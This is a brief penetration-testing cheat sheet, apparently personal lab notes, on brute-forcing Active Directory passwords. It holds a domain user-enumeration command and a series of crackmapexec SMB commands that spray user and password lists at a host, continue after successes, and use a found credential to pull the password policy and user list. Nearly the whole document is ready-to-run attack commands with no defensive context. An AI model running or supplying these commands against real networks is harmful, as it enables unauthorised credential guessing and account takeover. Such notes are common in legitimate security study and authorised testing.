# Password Bruteforcing on Active Directory

```shell
# Get-Possible users 
Net user /domain

# Get users.txt and passwords.txt
# Scan host ip for ports with nmap
crackmapexec smb 192.168.29.155 
crackmapexec smb 192.168.29.155 -u users.txt -p passwords.txt
crackmapexec smb 192.168.29.155 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 192.168.29.155 -u tgrant -p abc123 --pass-pol
crackmapexec smb 192.168.29.155 -u tgrant -p abc123 --users
```
